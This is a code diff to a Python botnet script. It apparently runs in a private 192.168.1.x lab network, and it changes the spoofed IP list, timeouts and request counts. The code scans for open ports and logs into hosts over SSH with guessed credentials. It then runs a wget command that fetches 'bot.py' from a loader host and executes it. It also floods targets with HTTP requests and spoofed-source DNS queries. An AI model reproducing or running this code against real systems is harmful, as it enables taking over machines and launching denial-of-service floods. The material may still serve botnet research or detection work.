@@ -24,9 +24,9 @@ except:
     exit('MOD_ACTUAL_IP or OUR_DNS value is not supplied.')
 
 
-MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.253', '192.168.1.54', 
-        '192.168.1.55', '192.168.1.56', '192.168.1.57', '192.168.1.158', 
-        '192.168.1.59', '192.168.1.60', '192.168.1.61', '192.168.1.62'
+MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.253', '192.168.1.154', 
+        '192.168.1.155', '192.168.1.156', '192.168.1.157', '192.168.1.158', 
+        '192.168.1.159', '192.168.1.160', '192.168.1.161', '192.168.1.162'
         ] 
 MOD_IP = None
 
@@ -134,12 +134,12 @@ class attack(Thread):
         if self._type == 0:
             connection = http.client.HTTPConnection(self._ip, port=self._port)
             headers = {'Content-type': 'application/json'}
-            for i in range(randint(10,20)):
+            for i in range(randint(20,40)):
                 connection.request("GET", self.get_random_string(7), headers=headers)
                 _ = connection.getresponse()
             connection.close()
         elif self._type == 1:
-            for i in range(randint(10,20)):
+            for i in range(randint(20,40)):
                 l_qname = 'somedomain.com'
                 dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=l_qname))
                 _ = sr1(dns_req, timeout=1, verbose=0)
@@ -161,9 +161,9 @@ class ssh_login(Thread):
         s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
         try:
-            s.connect(self._ip, 22, self._uname, self._pwd, timeout=2, auth_timeout=2)
+            s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
             # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
 
@@ -176,8 +176,10 @@ class ssh_login(Thread):
             with LOCK:
                 del OPEN_IPS[self._ip]
             print('Port closed for IP: {}. Deleting'.format(self._ip))
-        except:
+        except paramiko.ssh_exception.AuthenticationException:
             pass
+        except:
+            print(sys.exc_info())
             #print('Login Failed.')
         finally:
             s.close()
@@ -235,7 +237,7 @@ async def login():
         else:
             pass
 
-        print('[D] Login Thread.')
+        #print('[D] Login Thread.')
 
         for ip in OPEN_IPS.keys():
             if OPEN_IPS[ip]['login'] is False:
@@ -276,7 +278,7 @@ async def scan():
             t_scan = tcp_scan(get_ip_address(choice(SCAN_NETWORK)), int(choice(SCAN_PORT)))       
             t_scan.start()
 
-        print("[D] OPEN_IPS: {}".format(OPEN_IPS))
+        #print("[D] OPEN_IPS: {}".format(OPEN_IPS))
         await asyncio.sleep(duration)
 
 # Process msg.
